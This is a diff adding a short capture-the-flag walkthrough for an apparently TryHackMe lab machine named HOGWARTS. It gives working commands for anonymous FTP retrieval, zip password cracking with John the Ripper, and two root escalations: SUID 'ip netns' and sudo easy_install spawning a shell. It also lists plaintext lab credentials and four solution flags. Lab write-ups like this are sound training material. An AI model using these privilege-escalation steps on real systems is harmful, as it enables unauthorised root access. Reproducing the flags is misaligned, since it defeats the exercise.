@@ -1,0 +1,60 @@
+MACHINE : HOGWARTS
+
+USERS : hermoine , neville , draco
+
+PORTS : 
+
+      22 - HTTP
+    9050 - FTP 
+    9864 - SSH
+    9582 - HTTP 
+
+# CONNECT TO FTP  USING ANONYMOUS LOGIN
+
+  $ ftp <ip> 9050
+  $ cd ...
+  $ mget .I_saved_it_harry.zip
+  
+
+  $ zip2john .I_saved_it_harry.zip > hash
+  $ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# we will get neville's pass ; login via SSH
+
+  $ find / -type f -perm -4000 2>/dev/null
+
+# WE HAVE IP BINARY THAT HELPS TO ESCALATE :
+
+  $ ip netns add foo
+  $ ip netns exec foo /bin/sh -p
+
+@NOW WE ARE ROOT !!!
+
+-------------------------------------------------------------------------------------
+METHOD 2
+
+# LOG TO SSH AS DRACO 
+
+   draco:slytherin
+
+# draco can run easy_install:
+
+ $ TF=$(mktemp -d)
+ $ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+ $ sudo easy_install $TF
+
+
+NOW WE ARE ROOT !!!
+
+
+________________________________________________________________________________________
+
+# Flags:
+
+THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
+
+THM{its_wingardium_laviosaa_Ron}
+
+THM{Yeah_1_swallowed_the_sn1tch.}
+
+THM{I_unarm3d_dumbled0re}
